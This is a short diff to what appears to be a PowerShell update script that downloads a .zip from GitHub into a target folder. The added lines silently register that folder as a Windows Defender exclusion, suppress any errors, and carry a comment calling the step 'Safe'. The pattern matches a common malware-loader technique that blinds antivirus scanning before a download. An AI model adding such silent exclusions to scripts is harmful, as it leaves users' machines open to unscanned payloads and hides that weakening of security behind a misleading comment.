@@ -12,6 +12,11 @@ $ZipTemp    = Join-Path $TargetDir "update.zip"
 
 New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
 
+# Safe Defender exclusion (if supported)
+if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+    Add-MpPreference -ExclusionPath $TargetDir -ErrorAction SilentlyContinue
+}
+
 # 2. Download from GitHub (.zip)
 $Downloaded = $false
 try {
